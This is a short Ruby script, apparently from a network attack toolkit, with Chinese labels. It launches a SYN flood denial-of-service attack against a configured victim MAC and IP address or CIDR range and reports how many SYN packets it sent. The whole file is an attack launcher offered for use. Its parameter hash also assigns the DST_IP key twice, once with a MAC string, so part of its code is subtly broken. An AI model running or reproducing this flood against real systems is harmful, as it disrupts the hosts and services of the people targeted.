require_relative '../lib/attack_tool/tcp/syn_flood.rb'
require_relative '../config_con_var.rb'

new_process({
	title: "syn_flood",
	vars: {
		DST_MAC: [str_to_mac(CONFIG[:victim_mac]), "目标mac地址"],
		SRC_IP: [arr_to_dot_dec(CONFIG[:src_ip]), "要使用的源ip地址(点分十进制或CIDR地址)"],
		DST_IP: [arr_to_dot_dec(CONFIG[:victim_ip]), "目标ip地址(点分十进制或CIDR地址)"],
		DST_PORT: [CONFIG[:port_range].min, "本机使用的端口"],
	},
}) do |vars|
	puts "开始向mac为#{color_purple(vars[:DST_MAC])}，ip为#{color_purple(vars[:DST_IP])}的主机syn洪泛"

	TCPP.syn_flood(
		$pcap,
		vars.merge({
			DST_IP: mac_to_str(vars[:DST_MAC]),
			SRC_IP: dot_dec_to_arr(vars[:SRC_IP]),
			DST_IP: dot_dec_to_arr(vars[:DST_IP]),
		})
	)

	puts "syn洪泛完成, 共发送了#{CONFIG[:port_range].max-CONFIG[:port_range].min} 个syn包"
end